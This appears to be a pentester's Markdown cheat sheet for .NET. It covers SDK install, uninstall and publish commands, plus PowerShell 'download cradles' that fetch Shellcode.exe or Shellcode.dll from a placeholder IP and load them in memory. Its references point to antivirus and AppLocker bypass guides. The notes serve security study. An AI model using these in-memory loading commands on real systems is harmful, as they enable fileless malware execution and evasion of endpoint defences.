# Dotnet

## 01 - C\#

Setup Dotnet SDK

```
$ sudo ./dotnet-install.sh -i /usr/share/dotnet -c 6.0
```

Completely uninstall specific dotnet version

```bash
SDK_VERSION="5.0.16"
DOTNET_VERSION="5.0.213"
DOTNET_UNINSTALL_PATH="/usr/share/dotnet"
rm -rf $DOTNET_UNINSTALL_PATH/sdk/$SDK_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.NETCore.App/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.AspNetCore.All/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.AspNetCore.App/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/host/fxr/$DOTNET_VERSION
```

- Create .NET Console Project

```
> dotnet new console
```

- Compile C# Project of Windows executable

```
> dotnet publish -r win-x64 -c Release -p:PublishSingleFile=true --sc false -p:PublishTrimmed=true

> dotnet publish -r win10-x64 -c Release -p:PublishSingleFile=true --sc false -p:PublishTrimmed=true

> dotnet publish -f net6.0 -r win-x64 -c Release -p:PublishSingleFile=true --sc false -p:PublishTrimmed=true
```

Or you can just use `build`

```
> dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true

> dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:AllowUnsafeBlocks=true -p:PublishTrimmed=true
```

Download the cradle and load it from memory.

```powershell
$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.exe")
$assem = [System.Reflection.Assembly]::Load($data)
[Shell.Program()]::Main()
# [Program()]::Main()
# [Shell.Program()]::Main("".Split())
```

Compile C# DLL

```
> dotnet new classlib

> dotnet publish -r win-x64 -c Release --sc false -p:PublishTrimmed=true

> dotnet build -r win-x64 -c Release --sc false -p:PublishTrimmed=true
```

Allow unsafe code

```
> dotnet publish -r win-x64 -c Release -p:AllowUnsafeBlocks=true --sc false -p:PublishTrimmed=true

> dotnet build -c Release -p:AllowUnsafeBlocks=true --sc false -p:PublishTrimmed=true
```

Execute Shellcode

```powershell
PS C:\> [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("DLLDropper.dll")
[RunDLLPublicFunc.Class1]::runner()
```

Download the cradle and load it from memory.

```powershell
$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.dll")
$assembly = [System.Reflection.Assembly]::Load($data)
$class = $assembly.GetType("Shellcode.Class1")
$method = $class.GetMethod("<method_name>")
$method.Invoke(0, $null)
```

---
## References

- [Arch Linux Wiki .NET](https://wiki.archlinux.org/title/.NET)

- [https://medium.com/@carlosprincipal1/how-to-bypass-antivirus-av-2020-easy-method-69749892928b](https://medium.com/@carlosprincipal1/how-to-bypass-antivirus-av-2020-easy-method-69749892928b)

- [Purpl3f0xsecur1ty.tech AV Evasion.html](https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html)

- [Pentestlab Blog: Applocker Bypass Assembly Load](https://pentestlab.blog/2017/06/06/applocker-bypass-assembly-load/)

- [In3x0rabl3: OSEP](https://github.com/In3x0rabl3/OSEP)

- [https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481)